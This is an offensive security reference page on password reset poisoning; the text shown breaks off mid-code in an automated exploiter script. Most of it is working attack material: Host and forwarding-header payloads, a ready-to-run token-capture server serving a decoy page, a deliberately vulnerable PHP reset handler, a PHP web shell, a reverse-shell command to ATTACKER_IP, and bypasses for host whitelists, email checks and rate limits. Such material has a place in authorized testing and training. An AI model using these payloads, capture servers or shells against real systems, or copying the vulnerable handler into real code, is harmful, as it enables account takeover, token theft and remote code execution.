---
title: Password Reset Poisoning
description: Complete breakdown of Password Reset Poisoning attacks, Host header manipulation payloads, token theft techniques, and privilege escalation chains.
navigation:
  icon: i-lucide-key-round
  title: Password Reset Poisoning
---

## What is Password Reset Poisoning?

Password Reset Poisoning is an attack where an adversary **manipulates the password reset process** to redirect the reset link to an attacker-controlled server. The attacker exploits the application's trust in the `Host` header or other client-controllable inputs when generating password reset URLs.

::callout
---
icon: i-lucide-triangle-alert
color: amber
---
The vulnerability exists because the application **dynamically constructs the reset URL** using the incoming request's `Host` header, `X-Forwarded-Host`, or similar headers — without proper validation. When the victim clicks the poisoned link, their **reset token is leaked** to the attacker.
::

::card-group
  ::card
  ---
  title: PortSwigger Research
  icon: i-lucide-flask-conical
  to: https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning
  target: _blank
  ---
  PortSwigger Web Security Academy — Password Reset Poisoning via Host header manipulation.
  ::

  ::card
  ---
  title: OWASP Forgot Password Cheat Sheet
  icon: i-lucide-book-open
  to: https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html
  target: _blank
  ---
  OWASP secure implementation guidelines for password reset functionality.
  ::

  ::card
  ---
  title: CWE-640
  icon: i-lucide-shield-alert
  to: https://cwe.mitre.org/data/definitions/640.html
  target: _blank
  ---
  Weak Password Recovery Mechanism for Forgotten Password — MITRE CWE classification.
  ::

  ::card
  ---
  title: HackTricks — Reset Password
  icon: i-lucide-terminal
  to: https://book.hacktricks.wiki/en/pentesting-web/reset-password.html
  target: _blank
  ---
  Practical exploitation guide for password reset vulnerabilities in real-world applications.
  ::
::

---

## How It Works

Understanding the normal flow versus the poisoned flow is essential for exploitation.

::tabs
  :::tabs-item{icon="i-lucide-check-circle" label="Normal Flow"}

  In a legitimate password reset flow, the application generates a reset link pointing to **its own domain**.

  ::steps{level="4"}

  #### User requests a password reset

  ```http
  POST /forgot-password HTTP/1.1
  Host: legitimate-app.com
  Content-Type: application/x-www-form-urlencoded

  email=victim@example.com
  ```

  #### Server generates reset token and constructs URL

  The server uses the `Host` header to build the reset link.

  ```python [Server-Side Logic]
  reset_token = generate_secure_token()
  # URL built using Host header
  reset_url = f"https://{request.headers['Host']}/reset?token={reset_token}"
  send_email(user.email, reset_url)
  ```

  #### Victim receives legitimate email

  ```text [Email Content]
  Click here to reset your password:
  https://legitimate-app.com/reset?token=abc123secrettoken
  ```

  #### Victim clicks link and resets password safely

  The token goes only to the legitimate application.

  ::
  :::

  :::tabs-item{icon="i-lucide-skull" label="Poisoned Flow"}

  In the poisoned flow, the attacker **injects their domain** into the Host header, causing the reset URL to point to the attacker's server.

  ::steps{level="4"}

  #### Attacker sends poisoned reset request for victim's email

  ```http
  POST /forgot-password HTTP/1.1
  Host: attacker-server.com
  Content-Type: application/x-www-form-urlencoded

  email=victim@example.com
  ```

  #### Server blindly trusts Host header

  ```python [Server-Side Logic — Vulnerable]
  reset_token = generate_secure_token()
  # Attacker's domain is used!
  reset_url = f"https://{request.headers['Host']}/reset?token={reset_token}"
  send_email(user.email, reset_url)
  ```

  #### Victim receives poisoned email

  ```text [Poisoned Email Content]
  Click here to reset your password:
  https://attacker-server.com/reset?token=abc123secrettoken
  ```

  #### Victim clicks link — token is leaked to attacker

  The victim's browser sends the token to `attacker-server.com`. The attacker captures it and uses it on the real application.

  ```http [Attacker Captures Token]
  GET /reset?token=abc123secrettoken HTTP/1.1
  Host: attacker-server.com
  ```

  ::

  ::caution
  The victim **does receive the email** from the legitimate application. The only difference is the URL inside the email body points to the attacker's domain. Many users don't inspect URLs carefully before clicking.
  ::
  :::
::

---

## Attack Flow Diagram

```text [Password Reset Poisoning — Complete Flow]
┌─────────────┐         ┌──────────────────┐         ┌─────────────┐
│   ATTACKER  │         │  VULNERABLE APP  │         │   VICTIM    │
└──────┬──────┘         └────────┬─────────┘         └──────┬──────┘
       │                         │                          │
       │ 1. POST /forgot-password│                          │
       │    Host: evil.com       │                          │
       │    email=victim@corp.com│                          │
       │ ────────────────────►   │                          │
       │                         │                          │
       │                         │ 2. Server generates      │
       │                         │    reset token           │
       │                         │    ┌──────────────────┐  │
       │                         │    │ token = xyz789   │  │
       │                         │    │ url = https://   │  │
       │                         │    │ evil.com/reset?  │  │
       │                         │    │ token=xyz789     │  │
       │                         │    └──────────────────┘  │
       │                         │                          │
       │                         │ 3. Sends email to victim │
       │                         │ ─────────────────────►   │
       │                         │    "Click to reset:      │
       │                         │     https://evil.com/    │
       │                         │     reset?token=xyz789"  │
       │                         │                          │
       │                         │          4. Victim clicks│
       │                         │             the link     │
       │ ◄──────────────────────────────────────────────    │
       │  GET /reset?token=xyz789│                          │
       │  Host: evil.com        │                          │
       │                         │                          │
       │ 5. Attacker captures    │                          │
       │    token=xyz789         │                          │
       │                         │                          │
       │ 6. Uses token on real   │                          │
       │    application          │                          │
       │ POST /reset             │                          │
       │ Host: vulnerable-app.com│                          │
       │ token=xyz789            │                          │
       │ new_password=hacked123  │                          │
       │ ────────────────────►   │                          │
       │                         │                          │
       │ ╔═════════════════════╗ │                          │
       │ ║ ACCOUNT TAKEOVER!  ║ │                          │
       │ ║ Password changed   ║ │                          │
       │ ║ to attacker's      ║ │                          │
       │ ╚═════════════════════╝ │                          │
```

---

## Payloads

::caution
All payloads are intended for **authorized security testing and educational purposes only**. Unauthorized access to computer systems is illegal.
::

### Host Header Poisoning Payloads

The primary attack vector. These payloads manipulate headers that the server uses to construct the reset URL.

::code-group
```http [Basic Host Override]
POST /forgot-password HTTP/1.1
Host: attacker-server.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

```http [X-Forwarded-Host]
POST /forgot-password HTTP/1.1
Host: legitimate-app.com
X-Forwarded-Host: attacker-server.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

```http [X-Host]
POST /forgot-password HTTP/1.1
Host: legitimate-app.com
X-Host: attacker-server.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

```http [X-Forwarded-Server]
POST /forgot-password HTTP/1.1
Host: legitimate-app.com
X-Forwarded-Server: attacker-server.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

```http [X-Original-URL / X-Rewrite-URL]
POST /forgot-password HTTP/1.1
Host: legitimate-app.com
X-Original-URL: https://attacker-server.com/reset
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

```http [Forwarded Header (RFC 7239)]
POST /forgot-password HTTP/1.1
Host: legitimate-app.com
Forwarded: host=attacker-server.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```
::

### Dual Host / Ambiguous Host Payloads

Some servers handle duplicate or malformed Host headers differently. These payloads exploit parsing inconsistencies.

::code-group
```http [Duplicate Host Header]
POST /forgot-password HTTP/1.1
Host: legitimate-app.com
Host: attacker-server.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

```http [Host with Port Injection]
POST /forgot-password HTTP/1.1
Host: legitimate-app.com:@attacker-server.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

```http [Host Header — Subdomain Injection]
POST /forgot-password HTTP/1.1
Host: attacker-server.com/legitimate-app.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

```http [Host with Absolute URL]
POST https://legitimate-app.com/forgot-password HTTP/1.1
Host: attacker-server.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

```http [Tab/Space Injection in Host]
POST /forgot-password HTTP/1.1
Host: legitimate-app.com	attacker-server.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

```http [Host Override via @ Symbol]
POST /forgot-password HTTP/1.1
Host: legitimate-app.com@attacker-server.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```
::

### Comprehensive Header Injection — Full Spray

When you don't know which header the backend trusts, spray all possible override headers simultaneously.

::code-group
```http [Full Header Spray]
POST /forgot-password HTTP/1.1
Host: legitimate-app.com
X-Forwarded-Host: attacker-server.com
X-Forwarded-Server: attacker-server.com
X-Host: attacker-server.com
X-Original-Host: attacker-server.com
X-Rewrite-URL: https://attacker-server.com
X-Proxy-Host: attacker-server.com
X-Forwarded-For: attacker-server.com
X-Real-IP: attacker-server.com
Forwarded: host=attacker-server.com
X-Custom-IP-Authorization: attacker-server.com
X-Original-URL: /forgot-password
True-Client-IP: attacker-server.com
Referer: https://attacker-server.com
Origin: https://attacker-server.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

```http [Header Spray — JSON Body]
POST /api/forgot-password HTTP/1.1
Host: legitimate-app.com
X-Forwarded-Host: attacker-server.com
X-Host: attacker-server.com
X-Forwarded-Server: attacker-server.com
Forwarded: host=attacker-server.com
Content-Type: application/json

{
  "email": "victim@target.com"
}
```
::

### URL / Path Injection Payloads

Some applications construct the reset URL using parts of the request path or query parameters.

::code-group
```http [Redirect Parameter Poisoning]
POST /forgot-password?redirect=https://attacker-server.com HTTP/1.1
Host: legitimate-app.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

```http [Callback URL Injection]
POST /forgot-password HTTP/1.1
Host: legitimate-app.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com&callback_url=https://attacker-server.com/capture
```

```http [Return URL Manipulation]
POST /forgot-password HTTP/1.1
Host: legitimate-app.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com&return_to=https://attacker-server.com
```

```http [Next Parameter Injection]
POST /forgot-password?next=https://attacker-server.com HTTP/1.1
Host: legitimate-app.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```
::

### Referer-Based Token Leakage Payloads

Even without Host header poisoning, reset tokens can leak via the `Referer` header when the reset page loads external resources.

::code-group
```html [External Image on Reset Page]
<!-- If the reset page loads any external resources -->
<!-- The Referer header will contain the full URL with token -->

<!-- Attacker needs to find/inject an external resource on the reset page -->
<img src="https://attacker-server.com/pixel.gif">

<!-- When victim visits: -->
<!-- https://legitimate-app.com/reset?token=xyz789 -->
<!-- The browser sends: -->
<!-- Referer: https://legitimate-app.com/reset?token=xyz789 -->
<!-- to attacker-server.com -->
```

```http [Attacker's Access Log]
# Attacker sees in their server logs:
GET /pixel.gif HTTP/1.1
Host: attacker-server.com
Referer: https://legitimate-app.com/reset?token=xyz789
User-Agent: Mozilla/5.0 ...
```
::

### Dangling Markup Token Exfiltration

::code-group
```http [Dangling Markup via Host]
POST /forgot-password HTTP/1.1
Host: legitimate-app.com:'<a href="//attacker-server.com/?
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

```text [Resulting Email HTML]
<!-- The injected markup captures everything after it -->
<a href="https://legitimate-app.com:'<a href="//attacker-server.com/?/reset?token=xyz789">
Reset Password
</a>
<!-- Token is captured as part of the attacker's URL -->
```
::

---

### Token Capture Server

You need a server to capture the leaked reset tokens. Here are ready-to-deploy options.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Python"}
  ::code-collapse

  ```python [token_capture_server.py]
  #!/usr/bin/env python3
  """
  Password Reset Token Capture Server
  Logs all incoming requests with full headers and parameters
  For authorized penetration testing only
  """

  from http.server import HTTPServer, BaseHTTPRequestHandler
  from urllib.parse import urlparse, parse_qs
  from datetime import datetime
  import json
  import ssl
  import sys
  import os

  LOG_FILE = "captured_tokens.json"
  captured = []

  class TokenCaptureHandler(BaseHTTPRequestHandler):
      
      def _capture(self, method):
          timestamp = datetime.now().isoformat()
          parsed = urlparse(self.path)
          params = parse_qs(parsed.query)
          
          entry = {
              "timestamp": timestamp,
              "method": method,
              "path": self.path,
              "params": params,
              "headers": dict(self.headers),
              "client": f"{self.client_address[0]}:{self.client_address[1]}",
              "referer": self.headers.get("Referer", "None"),
          }
          
          # Extract token from various parameter names
          token_params = ['token', 'reset_token', 'code', 'key', 'hash', 't', 'id']
          for tp in token_params:
              if tp in params:
                  entry["CAPTURED_TOKEN"] = params[tp][0]
                  print(f"\n{'='*60}")
                  print(f"[!!!] TOKEN CAPTURED: {params[tp][0]}")
                  print(f"      Parameter: {tp}")
                  print(f"      Time: {timestamp}")
                  print(f"      From: {entry['client']}")
                  print(f"      Referer: {entry['referer']}")
                  print(f"{'='*60}\n")
                  break
          
          # Check Referer for tokens too
          referer = self.headers.get("Referer", "")
          if "token=" in referer or "reset" in referer:
              entry["REFERER_TOKEN_LEAK"] = referer
              print(f"\n{'='*60}")
              print(f"[!!!] TOKEN IN REFERER: {referer}")
              print(f"      Time: {timestamp}")
              print(f"{'='*60}\n")
          
          captured.append(entry)
          
          # Save to file
          with open(LOG_FILE, 'w') as f:
              json.dump(captured, f, indent=2)
          
          # Log all requests
          print(f"[{timestamp}] {method} {self.path}")
          print(f"  Client: {entry['client']}")
          print(f"  Params: {params}")
          
          return entry
      
      def do_GET(self):
          self._capture("GET")
          
          # Serve a convincing page
          html = """
          <!DOCTYPE html>
          <html>
          <head><title>Reset Password</title></head>
          <body>
          <div style="max-width:400px;margin:100px auto;font-family:sans-serif;text-align:center;">
            <h2>Password Reset</h2>
            <p>This password reset link has expired.</p>
            <p>Please <a href="https://legitimate-app.com/forgot-password">request a new one</a>.</p>
          </div>
          </body>
          </html>
          """
          
          self.send_response(200)
          self.send_header('Content-Type', 'text/html')
          self.end_headers()
          self.wfile.write(html.encode())
      
      def do_POST(self):
          content_length = int(self.headers.get('Content-Length', 0))
          body = self.rfile.read(content_length).decode()
          entry = self._capture("POST")
          entry["body"] = body
          
          self.send_response(200)
          self.send_header('Content-Type', 'application/json')
          self.end_headers()
          self.wfile.write(json.dumps({"status": "ok"}).encode())
      
      def log_message(self, format, *args):
          pass  # Suppress default logging

  def run(port=80, use_https=False):
      server = HTTPServer(('0.0.0.0', port), TokenCaptureHandler)
      
      if use_https:
          context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
          context.load_cert_chain('cert.pem', 'key.pem')
          server.socket = context.wrap_socket(server.socket, server_side=True)
      
      protocol = "HTTPS" if use_https else "HTTP"
      print(f"[*] Token Capture Server running on {protocol} port {port}")
      print(f"[*] Logging to {LOG_FILE}")
      print(f"[*] Press Ctrl+C to stop\n")
      
      try:
          server.serve_forever()
      except KeyboardInterrupt:
          print(f"\n[*] Captured {len(captured)} requests total")
          print(f"[*] Tokens saved to {LOG_FILE}")
          server.server_close()

  if __name__ == "__main__":
      port = int(sys.argv[1]) if len(sys.argv) > 1 else 80
      use_ssl = "--https" in sys.argv
      run(port, use_ssl)
  ```

  ::


  :::tabs-item{icon="i-lucide-server" label="Netcat (Quick)"}
  ```bash [Quick Netcat Listener]
  # Simple one-liner to capture the token
  while true; do echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<h1>Expired</h1>" | nc -lvnp 80; done

  # With logging
  while true; do echo -e "HTTP/1.1 200 OK\r\n\r\nExpired" | nc -lvnp 80 | tee -a captures.log; done
  ```
  :::

  :::tabs-item{icon="i-lucide-cloud" label="Burp Collaborator"}
  ```text [Using Burp Collaborator]
  # Use your Burp Collaborator domain as the attacker server
  
  POST /forgot-password HTTP/1.1
  Host: YOUR-COLLABORATOR-ID.burpcollaborator.net
  Content-Type: application/x-www-form-urlencoded

  email=victim@target.com

  # Or with X-Forwarded-Host
  POST /forgot-password HTTP/1.1
  Host: legitimate-app.com
  X-Forwarded-Host: YOUR-COLLABORATOR-ID.burpcollaborator.net
  Content-Type: application/x-www-form-urlencoded

  email=victim@target.com

  # Check Collaborator tab for incoming HTTP requests with token
  ```
  :::

  :::tabs-item{icon="i-lucide-webhook" label="Webhook.site"}
  ```text [Using Webhook.site]
  # 1. Go to https://webhook.site — get unique URL
  # 2. Use it as attacker server in payloads
  
  POST /forgot-password HTTP/1.1
  Host: legitimate-app.com
  X-Forwarded-Host: webhook.site/unique-id
  Content-Type: application/x-www-form-urlencoded

  email=victim@target.com

  # 3. Check webhook.site dashboard for captured tokens
  ```
  :::


---

## Docker Compose — Vulnerable Lab

Deploy a local vulnerable environment to practice the attack safely.

::code-collapse

```yaml [docker-compose.yml]
version: '3.8'

services:
  # Vulnerable Application
  vulnerable-app:
    build:
      context: ./vulnerable-app
      dockerfile: Dockerfile
    ports:
      - "8080:80"
    environment:
      - DB_HOST=db
      - DB_NAME=app_db
      - DB_USER=appuser
      - DB_PASS=apppass123
      - MAIL_HOST=mailcatcher
      - MAIL_PORT=1025
    depends_on:
      - db
      - mailcatcher
    networks:
      - lab-net

  # Database
  db:
    image: mysql:8.0
    environment:
      MYSQL_ROOT_PASSWORD: rootpass
      MYSQL_DATABASE: app_db
      MYSQL_USER: appuser
      MYSQL_PASSWORD: apppass123
    volumes:
      - db-data:/var/lib/mysql
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
    networks:
      - lab-net

  # Mail Catcher — View poisoned emails
  mailcatcher:
    image: schickling/mailcatcher
    ports:
      - "1080:1080"   # Web UI to view emails
      - "1025:1025"   # SMTP port
    networks:
      - lab-net

  # Attacker's Token Capture Server
  attacker-server:
    image: python:3.11-slim
    ports:
      - "9090:80"
    volumes:
      - ./token_capture_server.py:/app/server.py
    command: python /app/server.py
    networks:
      - lab-net

volumes:
  db-data:

networks:
  lab-net:
    driver: bridge
```

::

::code-collapse

```sql [init.sql]
-- Database initialization for vulnerable lab

CREATE TABLE IF NOT EXISTS users (
    id INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(100) NOT NULL,
    email VARCHAR(255) NOT NULL UNIQUE,
    password_hash VARCHAR(255) NOT NULL,
    role ENUM('user', 'admin') DEFAULT 'user',
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS password_resets (
    id INT AUTO_INCREMENT PRIMARY KEY,
    email VARCHAR(255) NOT NULL,
    token VARCHAR(255) NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    used BOOLEAN DEFAULT FALSE,
    INDEX idx_token (token),
    INDEX idx_email (email)
);

-- Insert test users
INSERT INTO users (username, email, password_hash, role) VALUES
('admin', 'admin@target.com', '$2y$10$hashhashhash', 'admin'),
('victim', 'victim@target.com', '$2y$10$hashhashhash', 'user'),
('testuser', 'test@target.com', '$2y$10$hashhashhash', 'user');
```

::

::code-collapse

```php [vulnerable-app/forgot-password.php]
<?php
/**
 * VULNERABLE PASSWORD RESET — FOR TESTING ONLY
 * This code intentionally uses Host header to build reset URL
 */

require_once 'config.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
    
    if (!$email) {
        die(json_encode(['error' => 'Invalid email']));
    }
    
    // Check if user exists
    $stmt = $pdo->prepare("SELECT id, username FROM users WHERE email = ?");
    $stmt->execute([$email]);
    $user = $stmt->fetch();
    
    if ($user) {
        // Generate reset token
        $token = bin2hex(random_bytes(32));
        
        // Store token in database
        $stmt = $pdo->prepare(
            "INSERT INTO password_resets (email, token) VALUES (?, ?)"
        );
        $stmt->execute([$email, $token]);
        
        // VULNERABILITY: Using Host header to construct URL
        // Check multiple headers (making it even more exploitable)
        $host = $_SERVER['HTTP_X_FORWARDED_HOST'] 
            ?? $_SERVER['HTTP_X_HOST']
            ?? $_SERVER['HTTP_HOST']
            ?? 'localhost';
        
        $scheme = isset($_SERVER['HTTPS']) ? 'https' : 'http';
        $reset_url = "{$scheme}://{$host}/reset-password?token={$token}";
        
        // Send email with poisoned URL
        $subject = "Password Reset Request";
        $body = "
            <html>
            <body>
                <h2>Password Reset</h2>
                <p>Hi {$user['username']},</p>
                <p>Click the link below to reset your password:</p>
                <p><a href='{$reset_url}'>{$reset_url}</a></p>
                <p>This link expires in 1 hour.</p>
                <p>If you didn't request this, ignore this email.</p>
            </body>
            </html>
        ";
        
        // Send via SMTP
        mail($email, $subject, $body, "Content-Type: text/html");
        
        // Always return success (prevent user enumeration)
        echo json_encode([
            'success' => true, 
            'message' => 'If an account exists, a reset link has been sent.'
        ]);
    } else {
        // Same response to prevent enumeration
        echo json_encode([
            'success' => true,
            'message' => 'If an account exists, a reset link has been sent.'
        ]);
    }
}
?>
```

::

---

## Privilege Escalation via Password Reset Poisoning

::warning
Password Reset Poisoning provides a direct path to **Account Takeover (ATO)**, which can then be chained into full system compromise depending on the victim's role.
::

### How PrivEsc Works

The privilege escalation chain begins with account takeover and extends based on the compromised account's access level.

::tabs
  :::tabs-item{icon="i-lucide-shield" label="Vertical PrivEsc"}

  **Vertical Privilege Escalation** — targeting accounts with higher privileges.

  ::steps{level="4"}

  #### Identify high-value targets

  Enumerate admin or privileged user emails through various techniques.

  ```text [Common Admin Email Patterns]
  admin@target.com
  administrator@target.com
  root@target.com
  it-admin@target.com
  sysadmin@target.com
  webmaster@target.com
  devops@target.com
  cto@target.com
  security@target.com
  ```

  #### Send poisoned reset request for admin

  ```http
  POST /forgot-password HTTP/1.1
  Host: legitimate-app.com
  X-Forwarded-Host: attacker-server.com
  Content-Type: application/x-www-form-urlencoded

  email=admin@target.com
  ```

  #### Capture admin's reset token

  When the admin clicks the link in their email, the token is sent to `attacker-server.com`.

  ```text [Captured on Attacker Server]
  [!!!] TOKEN CAPTURED: 8f14e45fceea167a5a36dedd4bea2543
        Parameter: token
        Time: 2024-01-15T14:32:00
        Referer: None
  ```

  #### Reset admin password and login

  ```http [Reset Password]
  POST /reset-password HTTP/1.1
  Host: legitimate-app.com
  Content-Type: application/x-www-form-urlencoded

  token=8f14e45fceea167a5a36dedd4bea2543&password=Pwned!2024&confirm=Pwned!2024
  ```

  #### Access admin panel — Full PrivEsc achieved

  ```http [Admin Access]
  POST /login HTTP/1.1
  Host: legitimate-app.com
  Content-Type: application/x-www-form-urlencoded

  username=admin&password=Pwned!2024
  ```

  ::
  :::

  :::tabs-item{icon="i-lucide-layers" label="PrivEsc Chain"}

  **Full Exploitation Chain** — from password reset to system compromise.

  | Step | Technique | Access Level |
  |------|-----------|-------------|
  | 1 | Password Reset Poisoning | Capture admin reset token |
  | 2 | Account Takeover | Admin panel access |
  | 3 | File Upload via Admin Panel | Upload web shell |
  | 4 | Web Shell Execution | Remote Code Execution as `www-data` |
  | 5 | Reverse Shell | Interactive system shell |
  | 6 | Privilege Escalation (Linux) | `sudo -l`, SUID, kernel exploit |
  | 7 | Root Access | Full system compromise |

  ::code-group
  ```bash [Step 3 — Upload Web Shell via Admin]
  # Use admin panel's file upload to upload a PHP shell
  curl -X POST https://target.com/admin/upload \
    -b "session=admin_session_cookie" \
    -F "file=@shell.php" \
    -F "path=/uploads/"
  ```

  ```php [shell.php — Simple Web Shell]
  <?php
  // Minimal web shell for PoC
  if(isset($_REQUEST['cmd'])){
      echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
  }
  ?>
  ```

  ```bash [Step 5 — Reverse Shell]
  # Trigger reverse shell from web shell
  curl "https://target.com/uploads/shell.php?cmd=bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261"

  # Listener on attacker machine
  nc -lvnp 4444
  ```

  ```bash [Step 6 — Linux PrivEsc]
  # Check sudo permissions
  sudo -l

  # Find SUID binaries
  find / -perm -4000 -type f 2>/dev/null

  # Check for writable cron jobs
  ls -la /etc/cron*

  # Kernel exploit check
  uname -a
  cat /etc/os-release
  ```
  ::
  :::

  :::tabs-item{icon="i-lucide-database" label="Data Exfiltration"}

  **Post-Exploitation** — what an attacker can access after account takeover.

  ::field-group
    ::field{name="User PII" type="critical"}
    Names, emails, phone numbers, addresses — GDPR/CCPA violation exposure.
    ::

    ::field{name="Payment Data" type="critical"}
    Stored credit cards, billing addresses, transaction history.
    ::

    ::field{name="API Keys & Secrets" type="critical"}
    Admin panels often expose API keys, database credentials, third-party service tokens.
    ::

    ::field{name="Other User Accounts" type="high"}
    Admin can reset other users' passwords, creating cascading account takeovers.
    ::

    ::field{name="Application Source Code" type="high"}
    Admin file managers or backup features may expose application source code.
    ::

    ::field{name="Internal Network Access" type="high"}
    Admin panels sometimes provide access to internal services, SSRF opportunities, or database management tools.
    ::
  ::
  :::
::

---

## Bypassing Common Protections

::accordion
  :::accordion-item{icon="i-lucide-shield-check" label="Bypass: Host Header Whitelist"}
  
  When the application validates the Host header against a whitelist, try these bypass techniques.

  ::code-group
  ```http [Subdomain Bypass]
  # If *.target.com is allowed
  Host: attacker.target.com
  
  # Or use DNS rebinding
  Host: target.com.attacker-server.com
  ```

  ```http [Port Injection]
  Host: legitimate-app.com:attacker-server.com
  
  # Or with encoded characters
  Host: legitimate-app.com%00@attacker-server.com
  ```

  ```http [Fallback to Override Headers]
  # Host passes validation, override header is used for URL construction
  Host: legitimate-app.com
  X-Forwarded-Host: attacker-server.com
  ```

  ```http [Case Sensitivity]
  Host: LEGITIMATE-APP.COM@attacker-server.com
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-mail" label="Bypass: Email Parameter Manipulation"}
  
  Some applications validate the email before processing. Try manipulating the email parameter.

  ::code-group
  ```http [Carbon Copy via Email Syntax]
  POST /forgot-password HTTP/1.1
  Host: legitimate-app.com
  Content-Type: application/x-www-form-urlencoded

  email=victim@target.com%0a%0dcc:attacker@evil.com
  ```

  ```http [Array Parameter]
  POST /forgot-password HTTP/1.1
  Host: legitimate-app.com
  Content-Type: application/x-www-form-urlencoded

  email[]=victim@target.com&email[]=attacker@evil.com
  ```

  ```http [JSON Array]
  POST /api/forgot-password HTTP/1.1
  Host: legitimate-app.com
  Content-Type: application/json

  {
    "email": ["victim@target.com", "attacker@evil.com"]
  }
  ```

  ```http [Separator Injection]
  email=victim@target.com,attacker@evil.com
  email=victim@target.com;attacker@evil.com
  email=victim@target.com%20attacker@evil.com
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-key" label="Bypass: Token Validation"}
  
  Even if the Host header is fixed, try attacking the token validation mechanism.

  ::code-group
  ```http [Predictable Token — Sequential]
  # If tokens are sequential or timestamp-based
  # Reset your own account, observe token pattern
  # Token 1: reset_token_1705312800
  # Token 2: reset_token_1705312801
  # Predict victim's token based on timing
  ```

  ```http [Token Reuse — Race Condition]
  # Trigger multiple resets simultaneously
  # Some applications don't invalidate previous tokens
  
  # Request 1 (attacker's email — captures token format)
  POST /forgot-password HTTP/1.1
  email=attacker@evil.com

  # Request 2 (victim's email — within same second)
  POST /forgot-password HTTP/1.1
  email=victim@target.com

  # If tokens are time-based, they may be identical or predictable
  ```

  ```http [Empty/Null Token]
  # Some broken implementations accept empty tokens
  GET /reset-password?token= HTTP/1.1
  GET /reset-password?token=null HTTP/1.1
  GET /reset-password?token=undefined HTTP/1.1
  GET /reset-password?token=0 HTTP/1.1
  GET /reset-password?token[]=  HTTP/1.1
  ```
  ::
  :::

  :::accordion-item{icon="i-lucide-network" label="Bypass: Rate Limiting"}
  
  Rate limiting on the reset endpoint can be bypassed.

  ::code-group
  ```http [IP Rotation Headers]
  X-Forwarded-For: 127.0.0.1
  X-Real-IP: 10.0.0.1
  X-Client-IP: 192.168.1.1
  X-Originating-IP: 172.16.0.1
  True-Client-IP: 8.8.8.8
  ```

  ```http [Case/Encoding Variation]
  # Vary the endpoint path
  POST /forgot-password HTTP/1.1
  POST /Forgot-Password HTTP/1.1
  POST /forgot-password/ HTTP/1.1
  POST /forgot-password? HTTP/1.1
  POST //forgot-password HTTP/1.1
  POST /forgot-password%00 HTTP/1.1
  POST /./forgot-password HTTP/1.1
  ```

  ```http [HTTP Method Switching]
  # Try different HTTP methods
  GET /forgot-password?email=victim@target.com HTTP/1.1
  PUT /forgot-password HTTP/1.1
  PATCH /forgot-password HTTP/1.1
  ```
  ::
  :::
::

---

## Automated Exploitation

::code-collapse

```python [password_reset_poisoner.py]
#!/usr/bin/env python3
"""
Password Reset Poisoning — Automated Scanner & Exploiter
Tests multiple header injection vectors automatically
For authorized penetration testing only
"""

import requests
import sys
import time
import json
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed

class PasswordResetPoisoner:

    POISON_HEADERS = [
        'X-Forwarded-Host',
        'X-Host',
        'X-Forwarded-Server',
        'X-Original-Host',
        'X-Proxy-Host',
        'X-Real-Host',
        'Forwarded',
        'X-Rewrite-URL',
        'X-Original-URL',
    ]

    def __init__(self, target_url, victim_email, attacker_host, reset_endpoint="/forgot-password"):
        self.target = target_url.rstrip('/')
        self.victim_email = victim_email
        self.attacker_host = attacker_host
        self.reset_endpoint = reset_endpoint
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def test_basic_host_override(self):
        """Test 1: Direct Host header replacement"""
        print("\n[*] Test 1: Direct Host header override")
        
        try:
            resp = requests.post(
                f"{self.target}{self.reset_endpoint}",
                data={"email": self.victim_email},
                headers={"Host": self.attacker_host},
                allow_redirects=False,
                timeout=10
            )
            
            result = {
                "test": "Direct Host Override",
                "status_code": resp.status_code,
                "response_length": len(resp.text),
                "headers_received": dict(resp.headers),
            }
            
            if resp.status_code in [200, 302, 301]:
                print(f"    [+] Got {resp.status_code} — Possible success!")
                result["potentially_vulnerable"] = True
            else:
                print(f"    [-] Got {resp.status_code} — Blocked or error")
                result["potentially_vulnerable"] = False
            
            self.results.append(result)
            return result
            
        except requests.exceptions.RequestException as e:
            print(f"    [ERROR] {e}")
            return None

    def test_header_injection(self):
        """Test 2: Override headers (X-Forwarded-Host, etc.)"""
        print("\n[*] Test 2: Header injection vectors")
        
        for header in self.POISON_HEADERS:
            try:
                if header == 'Forwarded':
                    headers = {header: f'host={self.attacker_host}'}
                else:
                    headers = {header: self.attacker_host}
                
                resp = self.session.post(
                    f"{self.target}{self.reset_endpoint}",
                    data={"email": self.victim_email},
                    headers=headers,
                    allow_redirects=False,
                    timeout=10
                )
                
                status = "✓ POSSIBLE" if resp.status_code in [200, 302] else "✗ BLOCKED"
                print(f"    {header}: {resp.status_code} — {status}")
                
                self.results.append({
